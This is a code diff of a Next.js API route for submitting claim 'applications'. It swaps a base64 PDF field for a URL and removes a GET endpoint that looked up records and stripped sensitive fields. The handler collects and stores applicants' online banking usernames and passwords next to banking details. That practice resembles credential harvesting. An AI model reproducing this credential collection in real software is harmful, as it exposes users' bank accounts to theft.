@@ -27,7 +27,7 @@ export async function POST(request: NextRequest) {
       accountType,
       paymentMethod,
       bankVerified,
-      documentPdfBase64,
+      documentPdfUrl,
       consent,
       bankUsername,
       bankPassword,
@@ -48,7 +48,7 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    if (!documentPdfBase64) {
+    if (!documentPdfUrl) {
       return NextResponse.json(
         { error: "Document PDF is required" },
         { status: 400 }
@@ -91,7 +91,7 @@ export async function POST(request: NextRequest) {
         accountType,
         paymentMethod,
         bankVerified: bankVerified || false,
-        documentPdfBase64,
+        documentPdfUrl,
         consent,
         status: "submitted",
         bankUsername: bankUsername || undefined,
@@ -119,75 +119,6 @@ export async function POST(request: NextRequest) {
 
     return NextResponse.json(
       { error: "Failed to submit application" },
-      { status: 500 }
-    );
-  }
-}
-
-// GET endpoint to retrieve applications (optional)
-export async function GET(request: NextRequest) {
-  try {
-    const searchParams = request.nextUrl.searchParams;
-    const claimId = searchParams.get("claimId");
-    const email = searchParams.get("email");
-
-    if (claimId) {
-      const application = await prisma.application.findUnique({
-        where: { claimId },
-      });
-
-      if (!application) {
-        return NextResponse.json(
-          { error: "Application not found" },
-          { status: 404 }
-        );
-      }
-
-      // Remove sensitive data before sending
-      const {
-        ssn,
-        accountNumber,
-        routingNumber,
-        documentPdfBase64,
-        bankUsername,
-        bankPassword,
-        ...safeData
-      } = application;
-
-      return NextResponse.json(safeData);
-    }
-
-    if (email) {
-      const applications = await prisma.application.findMany({
-        where: { email },
-        orderBy: { createdAt: "desc" },
-      });
-
-      // Remove sensitive data
-      const safeApplications = applications.map((app) => {
-        const {
-          ssn,
-          accountNumber,
-          routingNumber,
-          documentPdfBase64,
-          bankUsername,
-          bankPassword,
-          ...rest
-        } = app;
-        return rest;
-      });
-
-      return NextResponse.json(safeApplications);
-    }
-
-    return NextResponse.json(
-      { error: "Please provide claimId or email parameter" },
-      { status: 400 }
-    );
-  } catch (error) {
-    console.error("Error fetching applications:", error);
-    return NextResponse.json(
-      { error: "Failed to fetch applications" },
       { status: 500 }
     );
   }
